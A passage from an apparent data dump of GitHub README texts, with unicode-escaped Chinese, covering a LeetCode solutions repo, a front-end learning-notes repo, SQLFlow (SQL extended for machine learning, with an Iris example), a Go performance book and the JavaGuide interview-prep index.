\u6d89\u53ca\u5230\u7684\u9898\u76ee\u6709\u54ea\u4e9b\uff1f\n\u53cc\u6307\u9488\u95ee\u9898\u7684\u601d\u8def\u4ee5\u53ca\u76f8\u5173\u9898\u76ee\u6709\u54ea\u4e9b\uff1f\n\u6ed1\u52a8\u7a97\u53e3\u95ee\u9898\u7684\u601d\u8def\u4ee5\u53ca\u76f8\u5173\u9898\u76ee\u6709\u54ea\u4e9b\uff1f\n\u56de\u6eaf\u6cd5\u89e3\u9898\u7684\u601d\u8def\u4ee5\u53ca\u76f8\u5173\u9898\u76ee\u6709\u54ea\u4e9b\uff1f\n\n\u8ba1\u5212\n\n\n0494.target-sum\n\n\n0609.find-duplicate-file-in-system\n\n\n0010.regular-expression-matching\n\n\n0309.best-time-to-buy-and-sell-stock-with-cooldown\n\n\n0365.water-and-jug-problem\n\n\nanki \u5361\u7247 \u5b8c\u5584\n\n\n\u5b57\u7b26\u4e32\u7c7b\u95ee\u9898\u6c47\u603b\n\n\n\u4ea4\u6d41\u7fa4\n\u73b0\u5728\u8fd8\u662f\u521d\u7ea7\u9636\u6bb5\uff0c\u9700\u8981\u5927\u5bb6\u7684\u610f\u89c1\u548c\u53cd\u9988\uff0c\u4e3a\u4e86\u51cf\u5c11\u6c9f\u901a\u6210\u672c\uff0c\u6211\u7ec4\u5efa\u4e86\u4ea4\u6d41\u7fa4\u3002\u5927\u5bb6\u53ef\u4ee5\u626b\u7801\u8fdb\u5165\nQQ \u7fa4\n\n\u5fae\u4fe1\u7fa4\n\n(\u7531\u4e8e\u5fae\u4fe1\u7684\u9650\u5236\uff0c100\u4e2a\u4eba\u4ee5\u4e0a\u53ea\u80fd\u9080\u8bf7\u52a0\u5165\uff0c \u4f60\u53ef\u4ee5\u6dfb\u52a0\u6211\u7684\u673a\u5668\u4eba\u56de\u590d\u201cleetcode\u201d\u62c9\u4f60\u8fdb\u7fa4)\nTelegram\nhttp://t.me/leetcode_intl\n\u8d21\u732e\n\n\u5982\u679c\u6709\u60f3\u6cd5\u548c\u521b\u610f\uff0c\u8bf7\u63d0issue\u6216\u8005\u8fdb\u7fa4\u63d0\n\u5982\u679c\u60f3\u8d21\u732e\u4ee3\u7801\uff0c\u8bf7\u63d0PR\n\u5982\u679c\u9700\u8981\u4fee\u6539\u9879\u76ee\u4e2d\u56fe\u7247\uff0c\u8fd9\u91cc\u5b58\u653e\u4e86\u9879\u76ee\u4e2d\u7ed8\u5236\u56fe\u7684\u6e90\u4ee3\u7801\uff0c \u5927\u5bb6\u53ef\u4ee5\u7528draw.io\u6253\u5f00\u8fdb\u884c\u7f16\u8f91\u3002"}, {"title": "qianguyihao/Web", "language": "JavaScript", "content": "\u9879\u76ee\u4ecb\u7ecd\n\n\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/qianguyihao/Web\n\n\u524d\u7aef\u5165\u95e8\u548c\u8fdb\u9636\u5b66\u4e60\u7b14\u8bb0\u3002\u4ece\u96f6\u5f00\u59cb\u5b66\u524d\u7aef\uff0c\u505a\u4e00\u4e2aweb\u5168\u6808\u5de5\u7a0b\u5e08\u3002\u6301\u7eed\u66f4\u65b0\u4e2d...\n\u7ef4\u62a4\u8fd9\u4e2a\u9879\u76ee\u7684\u521d\u8877\uff0c\u53ef\u4ee5\u770b\u8fd9\u7bc7\u6587\u7ae0\uff1a\u300a\u88f8\u8f9e\u4e24\u4e2a\u6708\uff0c\u6d77\u6295\u4e00\u4e2a\u6708\uff0c\u4eceAndroid\u8f6c\u6218Web\u524d\u7aef\u7684\u6c42\u804c\u4e4b\u8def\u300b\n\u524d\u7aef\u5165\u95e8\u8def\u7ebf\u548c\u63a8\u8350\u5b66\u4e60\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u8fd9\u7bc7\u6587\u7ae0\uff1a\u300a2019\u5e74Web\u524d\u7aef\u5165\u95e8\u7684\u81ea\u5b66\u8def\u7ebf\u300b\n\u9879\u76ee\u6307\u5f15\n\u5982\u679c\u4f60\u53d1\u73b0\u6587\u4e2d\u7684\u56fe\u7247\u52a0\u8f7d\u4e0d\u51fa\u6765\uff0c\u4e0d\u59a8\u770b\u8fd9\u91cc\u3002\n\u5982\u679c\u4f60\u53d1\u73b0\u672c\u9879\u76ee\u6709\u5185\u5bb9\u4e0a\u7684\u9519\u8bef\uff0c\u6b22\u8fce\u63d0\u4ea4 issues \u8fdb\u884c\u6307\u6b63\u3002\n\u9879\u76ee\u76ee\u5f55\n\u8be6\u89c1 wiki\u3002\n\u5b66\u4e60\u4ea4\u6d41\n\u6211\u5efa\u4e86\u4e00\u4e2a\u201c\u524d\u7aef\u5b66\u4e60\u201d\u7684\u5fae\u4fe1\u4ea4\u6d41\u7fa4\u3002\u52a0\u6211\u5fae\u4fe1\uff08bootmei\uff09\uff0c\u62c9\u4f60\u8fdb\u7fa4\uff1a\n\n\n\u8fdb\u7fa4\u6697\u53f7\uff1a\u524d\u7aef\u5b66\u4e60\u3002\n\n\n\u8fdb\u7fa4\u8981\u6c42\uff1a\u5c11\u63d0\u95ee\u3001\u5c11\u95f2\u804a\u3001\u591a\u5206\u4eab\uff08\u957f\u671f\u6f5c\u6c34\u7684\uff0c\u5c31\u4e0d\u5fc5\u4e86\uff09\u3002\n\n\n\u4f60\u4e5f\u53ef\u4ee5\u5173\u6ce8\u5fae\u4fe1\u516c\u4f17\u53f7\u300c\u5343\u53e4\u58f9\u53f7\u300d\uff0c\u5b66\u4e60\u4ee3\u7801\u4e4b\u5916\u7684\u6280\u80fd\u3002\u626b\u4e00\u626b\u3002\u4f60\u5c06\u53d1\u73b0\u4e00\u4e2a\u5168\u65b0\u7684\u4e16\u754c\uff0c\u800c\u8fd9\u5c06\u662f\u4e00\u573a\u7f8e\u4e3d\u7684\u610f\u5916\uff1a"}, {"title": "sql-machine-learning/sqlflow", "language": "Go", "content": "SQLFlow\n   \nWhat is SQLFlow?\nSQLFlow is a bridge that connects a SQL engine, e.g. MySQL, Hive, SparkSQL or SQL Server, with TensorFlow and other machine learning toolkits.  SQLFlow extends the SQL language to enable model training, prediction and inference.\nMotivation\nThe current experience of development ML based applications requires a team of data engineers, data scientists, business analysts as well as a proliferation of advanced languages and programming tools like Python, SQL, SAS, SASS, Julia, R. The fragmentation of tooling and development environment brings additional difficulties in engineering to model trainning/tunning. What if we marry the most widely used data management/processing language SQL with ML/system capabilities and let engineers with SQL skills develop advanced ML based applications?\nThere are already some work in progress in the industry. We can write simple machine learning prediction (or scoring) algorithms in SQL using operators like DOT_PRODUCT. However, this requires copy-n-pasting model parameters from the training program to SQL statements. In the commercial world, we see some proprietary SQL engines providing extensions to support machine learning capabilities.\n\nMicrosoft SQL Server: Microsoft SQL Server has the machine learning service that runs machine learning programs in R or Python as an external script.\nTeradata SQL for DL: Teradata also provides a RESTful service, which is callable from the extended SQL SELECT syntax.\nGoogle BigQuery: Google BigQuery enables machine learning in SQL by introducing the CREATE MODEL statement.\n\nNone of the existing solution solves our pain point, instead we want it to be fully extensible.\n\nThis solution should be compatible to many SQL engines, instead of a specific version or type.\nIt should support sophisticated machine learning models, including TensorFlow for deep learning and xgboost for trees.\nWe also want the flexibility to configure and run cutting-edge ML algorithms including specifying feature crosses, at least, no Python or R code embedded in the SQL statements, and fully integrated with hyperparameter estimation.\n\nQuick Overview\nHere are examples for training a Tensorflow DNNClassifer model using sample data Iris.train, and running prediction using the trained model. You can see how cool it is to write some elegant ML code using SQL:\nsqlflow> SELECT *\nFROM iris.train\nTRAIN DNNClassifier\nWITH n_classes = 3, hidden_units = [10, 20]\nCOLUMN sepal_length, sepal_width, petal_length, petal_width\nLABEL class\nINTO sqlflow_models.my_dnn_model;\n\n...\nTraining set accuracy: 0.96721\nDone training\nsqlflow> SELECT *\nFROM iris.test\nPREDICT iris.predict.class\nUSING sqlflow_models.my_dnn_model;\n\n...\nDone predicting. Predict table : iris.predict\nHow to use SQLFlow\n\nInstallation\nRunning a Demo\nExtended SQL Syntax\n\nContributions\n\nBuild from source code.\nThe walkthrough of the source code\nThe choice of parser generator\n\nRoadmap\nSQLFlow will love to support as many mainstream ML frameworks and data sources as possible, but we feel like the expansion would be hard to be done merely on our own, so we would love to hear your options on what ML frameworks and data sources you are currently using and build upon. Please refer to our roadmap for specific timelines, also let us know your current scenarios and interests around SQLFlow project so we can prioritize based on the feedback from the community.\nFeedback\nYour feedback is our motivation to move on. Please let us know your questions, concerns, and issues by filing Github Issues.\nLicense\nApache License 2.0"}, {"title": "dgryski/go-perfbook", "language": "Go", "content": "go-perfbook\n\nThis document outlines best practices for writing high-performance Go code.\nThe first sections cover writing optimized code in any language.\nThe later sections cover Go-specific techniques.\nMultiple Language Versions\n\nEnglish\n\u4e2d\u6587\nEspa\u00f1ol\n\nTable of Contents\n\nWriting and Optimizing Go code\nHow to Optimize\n\nOptimization Workflow\nConcrete Optimization Tips\n\n\nData Changes\nAlgorithmic Changes\nBenchmark Inputs\nProgram Tuning\nOptimization Workflow Summary\nGarbage Collection\nRuntime and Compiler\nUnsafe\nCommon gotchas with the standard library\nAlternate Implementations\nCGO\nAdvanced Techniques\nAssembly\nOptimizing an Entire Service\nTooling\n\nProfiling\nTracer\n\n\nAppendix\n\nImplementing Research Papers\n\n\n\nContributing\nThis is a work-in-progress book in Go performance.\nThere are different ways to contribute:\n\nadd to or summarizes the resources in TODO\nadd bullet points or new topics to be covered\nwrite prose and flesh  out the sections in the book\n\nEventually sample programs to optimize and exercises will be needed (maybe).\nCoordination will be done in the #performance channel on the Gophers slack."}, {"title": "Snailclimb/JavaGuide", "language": "Java", "content": "\u70b9\u51fb\u8ba2\u9605Java\u9762\u8bd5\u8fdb\u9636\u6307\u5357(\u4e13\u4e3aJava\u9762\u8bd5\u65b9\u5411\u51c6\u5907)\u3002\u4e3a\u4ec0\u4e48\u8981\u5f04\u8fd9\u4e2a\u4e13\u680f?\n\n\n\n\n\n\n\n\n\n\n\n\nSpecial Sponsors\n\n\n\n\n\n\u63a8\u8350\u4e00\u4e0b\u6211\u7684\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u7ef4\u62a4\u7684\u9879\u76ee\uff1aprogrammer-advancement (\u6280\u672f\u4eba\u5458\u6210\u957f\u5fc5\u5907\uff01)\n\u63a8\u8350\u4f7f\u7528 https://snailclimb.top/JavaGuide/ \u5728\u7ebf\u9605\u8bfb(\u8bbf\u95ee\u901f\u5ea6\u6162\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528 https://snailclimb.gitee.io/javaguide )\uff0c\u5728\u7ebf\u9605\u8bfb\u5185\u5bb9\u672c\u4ed3\u5e93\u540c\u6b65\u4e00\u81f4\u3002\u8fd9\u79cd\u65b9\u5f0f\u9605\u8bfb\u7684\u4f18\u52bf\u5728\u4e8e\uff1a\u6709\u4fa7\u8fb9\u680f\u9605\u8bfb\u4f53\u9a8c\u66f4\u597d\uff0cGitee pages \u7684\u8bbf\u95ee\u901f\u5ea6\u76f8\u5bf9\u6765\u8bf4\u4e5f\u6bd4\u8f83\u5feb\u3002\n\u76ee\u5f55\n\nJava\n\n\u57fa\u7840\n\u5bb9\u5668\n\u5e76\u53d1\nJVM\nI/O\nJava 8\n\u7f16\u7a0b\u89c4\u8303\n\n\n\u7f51\u7edc\n\u64cd\u4f5c\u7cfb\u7edf\n\nLinux\u76f8\u5173\n\n\n\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\n\n\u6570\u636e\u7ed3\u6784\n\u7b97\u6cd5\n\n\n\u6570\u636e\u5e93\n\nMySQL\nRedis\n\n\n\u7cfb\u7edf\u8bbe\u8ba1\n\n\u8bbe\u8ba1\u6a21\u5f0f\n\u5e38\u7528\u6846\u67b6\n\u6570\u636e\u901a\u4fe1\n\u7f51\u7ad9\u67b6\u6784\n\n\n\u9762\u8bd5\u6307\u5357\n\n\u5907\u6218\u9762\u8bd5\n\u5e38\u89c1\u9762\u8bd5\u9898\u603b\u7ed3\n\u9762\u7ecf\n\n\n\u5de5\u5177\n\nGit\nDocker\n\n\n\u8d44\u6599\n\n\u4e66\u5355\nGithub\u699c\u5355\n\n\n\u5f85\u529e\n\u8bf4\u660e\n\nJava\n\u57fa\u7840\n\nJava \u57fa\u7840\u77e5\u8bc6\u56de\u987e\nJ2EE \u57fa\u7840\u77e5\u8bc6\u56de\u987e\n\n\u5bb9\u5668\n\n\u5e38\u89c1\u9762\u8bd5\u9898\nArrayList \u6e90\u7801\u5b66\u4e60\nLinkedList \u6e90\u7801\u5b66\u4e60\nHashMap(JDK1.8)\u6e90\u7801\u5b66\u4e60\n\n\u5e76\u53d1\n\nJava \u5e76\u53d1\u57fa\u7840\u5e38\u89c1\u9762\u8bd5\u9898\u603b\u7ed3\nJava \u5e76\u53d1\u8fdb\u9636\u5e38\u89c1\u9762\u8bd5\u9898\u603b\u7ed3\n\u5e76\u53d1\u5bb9\u5668\u603b\u7ed3\n\u4e50\u89c2\u9501\u4e0e\u60b2\u89c2\u9501\nJUC \u4e2d\u7684 Atomic \u539f\u5b50\u7c7b\u603b\u7ed3\nAQS \u539f\u7406\u4ee5\u53ca AQS \u540c\u6b65\u7ec4\u4ef6\u603b\u7ed3\n\nJVM\n\nJava\u5185\u5b58\u533a\u57df\nJVM\u5783\u573e\u56de\u6536\nJDK \u76d1\u63a7\u548c\u6545\u969c\u5904\u7406\u5de5\u5177\n\u300a\u6df1\u5165\u7406\u89e3Java\u865a\u62df\u673a\u300b\u7b2c2\u7248\u5b66\u4e60\u7b14\u8bb0\n\nI/O\n\nBIO,NIO,AIO \u603b\u7ed3 \nJava IO \u4e0e NIO\u7cfb\u5217\u6587\u7ae0\n\nJava 8\n\nJava 8 \u65b0\u7279\u6027\u603b\u7ed3\nJava 8 \u5b66\u4e60\u8d44\u6e90\u63a8\u8350\n\n\u7f16\u7a0b\u89c4\u8303\n\nJava \u7f16\u7a0b\u89c4\u8303\n\n\u7f51\u7edc\n\n\u8ba1\u7b97\u673a\u7f51\u7edc\u5e38\u89c1\u9762\u8bd5\u9898\n\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u77e5\u8bc6\u603b\u7ed3\nHTTPS\u4e2d\u7684TLS\n\n\u64cd\u4f5c\u7cfb\u7edf\nLinux\u76f8\u5173\n\n\u540e\u7aef\u7a0b\u5e8f\u5458\u5fc5\u5907\u7684 Linux \u57fa\u7840\u77e5\u8bc6\nShell \u7f16\u7a0b\u5165\u95e8\n\n\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\n\u6570\u636e\u7ed3\u6784\n\n\u6570\u636e\u7ed3\u6784\u77e5\u8bc6\u5b66\u4e60\u4e0e\u9762\u8bd5\n\n\u7b97\u6cd5\n\n\u7b97\u6cd5\u5b66\u4e60\u8d44\u6e90\u63a8\u8350\n\u51e0\u9053\u5e38\u89c1\u7684\u5b50\u7b26\u4e32\u7b97\u6cd5\u9898\u603b\u7ed3 \n\u51e0\u9053\u5e38\u89c1\u7684\u94fe\u8868\u7b97\u6cd5\u9898\u603b\u7ed3 \n\u5251\u6307offer\u90e8\u5206\u7f16\u7a0b\u9898\n\u516c\u53f8\u771f\u9898\n\u56de\u6eaf\u7b97\u6cd5\u7ecf\u5178\u6848\u4f8b\u4e4bN\u7687\u540e\u95ee\u9898\n\n\u6570\u636e\u5e93\nMySQL\n\nMySQL \u5b66\u4e60\u4e0e\u9762\u8bd5\n\u4e00\u5343\u884cMySQL\u5b66\u4e60\u7b14\u8bb0\nMySQL\u9ad8\u6027\u80fd\u4f18\u5316\u89c4\u8303\u5efa\u8bae\n\u641e\u5b9a\u6570\u636e\u5e93\u7d22\u5f15\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\n\u4e8b\u52a1\u9694\u79bb\u7ea7\u522b(\u56fe\u6587\u8be6\u89e3)\n\u4e00\u6761SQL\u8bed\u53e5\u5728MySQL\u4e2d\u5982\u4f55\u6267\u884c\u7684\n\nRedis\n\nRedis \u603b\u7ed3\nRedlock\u5206\u5e03\u5f0f\u9501\n\u5982\u4f55\u505a\u53ef\u9760\u7684\u5206\u5e03\u5f0f\u9501\uff0cRedlock\u771f\u7684\u53ef\u884c\u4e48\n\n\u7cfb\u7edf\u8bbe\u8ba1\n\u8bbe\u8ba1\u6a21\u5f0f\n\n\u8bbe\u8ba1\u6a21\u5f0f\u7cfb\u5217\u6587\u7ae0\n\n\u5e38\u7528\u6846\u67b6\nSpring\n\nSpring \u5b66\u4e60\u4e0e\u9762\u8bd5\nSpring\u4e2dbean\u7684\u4f5c\u7528\u57df\u4e0e\u751f\u547d\u5468\u671f\nSpringMVC \u5de5\u4f5c\u539f\u7406\u8be6\u89e3\n\nZooKeeper\n\nZooKeeper \u76f8\u5173\u6982\u5ff5\u603b\u7ed3\nZooKeeper \u6570\u636e\u6a21\u578b\u548c\u5e38\u89c1\u547d\u4ee4\n\n\u6570\u636e\u901a\u4fe1\n\n\u6570\u636e\u901a\u4fe1(RESTful\u3001RPC\u3001\u6d88\u606f\u961f\u5217)\u76f8\u5173\u77e5\u8bc6\u70b9\u603b\u7ed3\nDubbo \u603b\u7ed3\uff1a\u5173\u4e8e Dubbo \u7684\u91cd\u8981\u77e5\u8bc6\u70b9\n\u6d88\u606f\u961f\u5217\u603b\u7ed3\nRabbitMQ \u7684\u91cd\u8981\u6982\u5ff5\u4ee5\u53ca\u5b89\u88c5\n\n\u7f51\u7ad9\u67b6\u6784\n\n\u4e00\u6587\u8bfb\u61c2\u5206\u5e03\u5f0f\u5e94\u8be5\u5b66\u4ec0\u4e48\n8 \u5f20\u56fe\u8bfb\u61c2\u5927\u578b\u7f51\u7ad9\u6280\u672f\u67b6\u6784\n\u3010\u9762\u8bd5\u7cbe\u9009\u3011\u5173\u4e8e\u5927\u578b\u7f51\u7ad9\u7cfb\u7edf\u67b6\u6784\u4f60\u4e0d\u5f97\u4e0d\u61c2\u768410\u4e2a\u95ee\u9898\n\n\u9762\u8bd5\u6307\u5357\n\u5907\u6218\u9762\u8bd5\n\n\u3010\u5907\u6218\u9762\u8bd51\u3011\u7a0b\u5e8f\u5458\u7684\u7b80\u5386\u5c31\u8be5\u8fd9\u6837\u5199\n\u3010\u5907\u6218\u9762\u8bd52\u3011\u521d\u51fa\u8305\u5e90\u7684\u7a0b\u5e8f\u5458\u8be5\u5982\u4f55\u51c6\u5907\u9762\u8bd5\uff1f\n\u3010\u5907\u6218\u9762\u8bd53\u30117\u4e2a\u5927\u90e8\u5206\u7a0b\u5e8f\u5458\u5728\u9762\u8bd5\u524d\u5f88\u5173\u5fc3\u7684\u95ee\u9898\n\u3010\u5907\u6218\u9762\u8bd54\u3011Github\u4e0a\u5f00\u6e90\u7684Java\u9762\u8bd5/\u5b66\u4e60\u76f8\u5173\u7684\u4ed3\u5e93\u63a8\u8350\n\u3010\u5907\u6218\u9762\u8bd55\u3011\u5982\u679c\u9762\u8bd5\u5b98\u95ee\u4f60\u201c\u4f60\u6709\u4ec0\u4e48\u95ee\u9898\u95ee\u6211\u5417\uff1f\u201d\u65f6\uff0c\u4f60\u8be5\u5982\u4f55\u56de\u7b54\n\u3010\u5907\u6218\u9762\u8bd56\u3011\u7f8e\u56e2\u9762\u8bd5\u5e38\u89c1\u95ee\u9898\u603b\u7ed3\uff08\u9644\u8be6\u89e3\u7b54\u6848\uff09\n\n\u5e38\u89c1\u9762\u8bd5\u9898\u603b\u7ed3\n\n\u7b2c\u4e00\u5468\uff082018-8-7\uff09 (\u4e3a\u4ec0\u4e48 Java \u4e2d\u53ea\u6709\u503c\u4f20\u9012\u3001==\u4e0eequals\u3001 hashCode\u4e0eequals)\n\u7b2c\u4e8c\u5468\uff082018-8-13\uff09(String\u548cStringBuffer\u3001StringBuilder\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1fString\u4e3a\u4ec0\u4e48\u662f\u4e0d\u53ef\u53d8\u7684\uff1f\u3001\u4ec0\u4e48\u662f\u53cd\u5c04\u673a\u5236\uff1f\u53cd\u5c04\u673a\u5236\u7684\u5e94\u7528\u573a\u666f\u6709\u54ea\u4e9b\uff1f......)\n\u7b2c\u4e09\u5468\uff082018-08-22\uff09 \uff08Arraylist \u4e0e LinkedList \u5f02\u540c\u3001ArrayList \u4e0e Vector \u533a\u522b\u3001HashMap\u7684\u5e95\u5c42\u5b9e\u73b0\u3001HashMap \u548c Hashtable \u7684\u533a\u522b\u3001HashMap \u7684\u957f\u5ea6\u4e3a\u4ec0\u4e48\u662f2\u7684\u5e42\u6b21\u65b9\u3001HashSet \u548c HashMap \u533a\u522b\u3001ConcurrentHashMap \u548c Hashtable \u7684\u533a\u522b\u3001ConcurrentHashMap\u7ebf\u7a0b\u5b89\u5168\u7684\u5177\u4f53\u5b9e\u73b0\u65b9\u5f0f/\u5e95\u5c42\u5177\u4f53\u5b9e\u73b0\u3001\u96c6\u5408\u6846\u67b6\u5e95\u5c42\u6570\u636e\u7ed3\u6784\u603b\u7ed3\uff09\n\u7b2c\u56db\u5468(2018-8-30).md \uff08\u4e3b\u8981\u5185\u5bb9\u662f\u51e0\u9053\u9762\u8bd5\u5e38\u95ee\u7684\u591a\u7ebf\u7a0b\u57fa\u7840\u9898\u3002\uff09\n\n\u9762\u7ecf\n\n5\u9762\u963f\u91cc,\u7ec8\u83b7offer(2018\u5e74\u79cb\u62db)\n\u8682\u8681\u91d1\u670d2019\u5b9e\u4e60\u751f\u9762\u7ecf\u603b\u7ed3(\u5df2\u62ff\u53e3\u5934offer)\n2019\u5e74\u8682\u8681\u91d1\u670d\u3001\u5934\u6761\u3001\u62fc\u591a\u591a\u7684\u9762\u8bd5\u603b\u7ed3\n\n\u5de5\u5177\nGit\n\nGit\u5165\u95e8\n\nDocker\n\nDocker \u5165\u95e8\n\u4e00\u6587\u641e\u61c2 Docker \u955c\u50cf\u7684\u5e38\u7528\u64cd\u4f5c\uff01\n\n\u8d44\u6599\n\u4e66\u5355\n\nJava\u7a0b\u5e8f\u5458\u5fc5\u5907\u4e66\u5355\n\nGithub\u699c\u5355\n\nJava \u9879\u76ee\u6708\u699c\u5355\n\n\n\u5f85\u529e\n\n Java 8 \u65b0\u7279\u6027\u603b\u7ed3\n Java 8 \u65b0\u7279\u6027\u8be6\u89e3\n Java \u591a\u7ebf\u7a0b\u7c7b\u522b\u77e5\u8bc6\u91cd\u6784(---\u6b63\u5728\u8fdb\u884c\u4e2d---)\n BIO,NIO,AIO \u603b\u7ed3 \n Netty \u603b\u7ed3(---\u6b63\u5728\u8fdb\u884c\u4e2d---)\n \u6570\u636e\u7ed3\u6784\u603b\u7ed3\u91cd\u6784(---\u6b63\u5728\u8fdb\u884c\u4e2d---)\n\n\u8bf4\u660e\n\u4ecb\u7ecd\n\n\u5bf9\u4e8e Java \u521d\u5b66\u8005\u6765\u8bf4\uff1a \u672c\u6587\u6863\u503e\u5411\u4e8e\u7ed9\u4f60\u63d0\u4f9b\u4e00\u4e2a\u6bd4\u8f83\u8be6\u7ec6\u7684\u5b66\u4e60\u8def\u5f84\uff0c\u8ba9\u4f60\u5bf9\u4e8eJava\u6574\u4f53\u7684\u77e5\u8bc6\u4f53\u7cfb\u6709\u4e00\u4e2a\u521d\u6b65\u8ba4\u8bc6\u3002\u53e6\u5916\uff0c\u672c\u6587\u7684\u4e00\u4e9b\u6587\u7ae0\n\u4e5f\u662f\u4f60\u5b66\u4e60\u548c\u590d\u4e60 Java \u77e5\u8bc6\u4e0d\u9519\u7684\u5b9e\u8df5\uff1b\n\u5bf9\u4e8e\u975e Java \u521d\u5b66\u8005\u6765\u8bf4\uff1a \u672c\u6587\u6863\u66f4\u9002\u5408\u56de\u987e\u77e5\u8bc6\uff0c\u51c6\u5907\u9762\u8bd5\uff0c\u641e\u6e05\u9762\u8bd5\u5e94\u8be5\u628a\u91cd\u5fc3\u653e\u5728\u90a3\u4e9b\u95ee\u9898\u4e0a\u3002\u8981\u641e\u6e05\u695a\u8fd9\u4e2a\u9053\u7406\uff1a\u63d0\u524d\u77e5\u9053\u90a3\u4e9b\u9762\u8bd5\u5e38\u89c1\uff0c\u4e0d\u662f\u4e3a\u4e86\u80cc\u4e0b\u6765\u5e94\u4ed8\u9762\u8bd5\uff0c\u800c\u662f\u4e3a\u4e86\u8ba9\u4f60\u53ef\u4ee5\u66f4\u6709\u9488\u5bf9\u7684\u5b66\u4e60\u91cd\u70b9\u3002\n\nMarkdown \u683c\u5f0f\u53c2\u8003\uff1aGithub Markdown\u683c\u5f0f\uff0c\u8868\u60c5\u7d20\u6750\u6765\u81ea\uff1aEMOJI CHEAT SHEET\u3002\n\u5229\u7528 docsify \u751f\u6210\u6587\u6863\u90e8\u7f72\u5728 Github pages: docsify \u5b98\u7f51\u4ecb\u7ecd\n\u5173\u4e8e\u8f6c\u8f7d\n\u5982\u679c\u4f60\u9700\u8981\u8f6c\u8f7d\u672c\u4ed3\u5e93\u7684\u4e00\u4e9b\u6587\u7ae0\u5230\u81ea\u5df1\u7684\u535a\u5ba2\u7684\u8bdd\uff0c\u8bb0\u5f97\u6ce8\u660e\u539f\u6587\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002\n\u5982\u4f55\u5bf9\u8be5\u5f00\u6e90\u6587\u6863\u8fdb\u884c\u8d21\u732e\n\n\u7b14\u8bb0\u5185\u5bb9\u5927\u591a\u662f\u624b\u6572\uff0c\u6240\u4ee5\u96be\u514d\u4f1a\u6709\u7b14\u8bef\uff0c\u4f60\u53ef\u4ee5\u5e2e\u6211\u627e\u9519\u522b\u5b57\u3002\n\u5f88\u591a\u77e5\u8bc6\u70b9\u6211\u53ef\u80fd\u6ca1\u6709\u6d89\u53ca\u5230\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5bf9\u5176\u4ed6\u77e5\u8bc6\u70b9\u8fdb\u884c\u8865\u5145\u3002\n\u73b0\u6709\u7684\u77e5\u8bc6\u70b9\u96be\u514d\u5b58\u5728\u4e0d\u5b8c\u5584\u6216\u8005\u9519\u8bef\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5bf9\u5df2\u6709\u77e5\u8bc6\u70b9\u7684\u4fee\u6539/\u8865\u5145\u3002\n\n\u4e3a\u4ec0\u4e48\u8981\u505a\u8fd9\u4e2a\u5f00\u6e90\u6587\u6863\uff1f\n\u521d\u59cb\u60f3\u6cd5\u6e90\u4e8e\u81ea\u5df1\u7684\u4e2a\u4eba\u90a3\u4e00\u6bb5\u6bd4\u8f83\u8ff7\u832b\u7684\u5b66\u4e60\u7ecf\u5386\u3002\u4e3b\u8981\u76ee\u7684\u662f\u4e3a\u4e86\u901a\u8fc7\u8fd9\u4e2a\u5f00\u6e90\u5e73\u53f0\u6765\u5e2e\u52a9\u4e00\u4e9b\u5728\u5b66\u4e60 Java \u6216\u8005\u9762\u8bd5\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\u7684\u5c0f\u4f19\u4f34\u3002\n\u6295\u7a3f\n\u7531\u4e8e\u6211\u4e2a\u4eba\u80fd\u529b\u6709\u9650\uff0c\u5f88\u591a\u77e5\u8bc6\u70b9\u6211\u53ef\u80fd\u6ca1\u6709\u6d89\u53ca\u5230\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5bf9\u5176\u4ed6\u77e5\u8bc6\u70b9\u8fdb\u884c\u8865\u5145\u3002\u5927\u5bb6\u4e5f\u53ef\u4ee5\u5bf9\u81ea\u5df1\u7684\u6587\u7ae0\u8fdb\u884c\u81ea\u8350\uff0c\u5bf9\u4e8e\u4e0d\u9519\u7684\u6587\u7ae0\u4e0d\u4ec5\u53ef\u4ee5\u6210\u529f\u5728\u672c\u4ed3\u5e93\u5c55\u793a\u51fa\u6765\u66f4\u53ef\u4ee5\u83b7\u5f97\u4f5c\u8005\u9001\u51fa\u7684 50 \u5143\u5de6\u53f3\u7684\u4efb\u610f\u4e66\u7c4d\u8fdb\u884c\u5956\u52b1(\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6298\u73b050\u5143)\u3002\n\u8054\u7cfb\u6211\n\u6dfb\u52a0\u6211\u7684\u5fae\u4fe1\u5907\u6ce8\u201cGithub\u201d,\u56de\u590d\u5173\u952e\u5b57 \u201c\u52a0\u7fa4\u201d \u5373\u53ef\u5165\u7fa4\u3002\n\nContributor\n\u4e0b\u9762\u662f\u7b14\u4e3b\u6536\u96c6\u7684\u4e00\u4e9b\u5bf9\u672c\u4ed3\u5e93\u63d0\u8fc7\u6709\u4ef7\u503c\u7684pr\u6216\u8005issue\u7684\u670b\u53cb\uff0c\u4eba\u6570\u8f83\u591a\uff0c\u5982\u679c\u4f60\u4e5f\u5bf9\u672c\u4ed3\u5e93\u63d0\u8fc7\u4e0d\u9519\u7684pr\u6216\u8005issue\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u52a0\u6211\u7684\u5fae\u4fe1\u4e0e\u6211\u8054\u7cfb\u3002\u4e0b\u9762\u7684\u6392\u540d\u4e0d\u5206\u5148\u540e\uff01\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u516c\u4f17\u53f7\n\u5982\u679c\u5927\u5bb6\u60f3\u8981\u5b9e\u65f6\u5173\u6ce8\u6211\u66f4\u65b0\u7684\u6587\u7ae0\u4ee5\u53ca\u5206\u4eab\u7684\u5e72\u8d27\u7684\u8bdd\uff0c\u53ef\u4ee5\u5173\u6ce8\u6211\u7684\u516c\u4f17\u53f7\u3002\n\u300aJava\u9762\u8bd5\u7a81\u51fb\u300b: 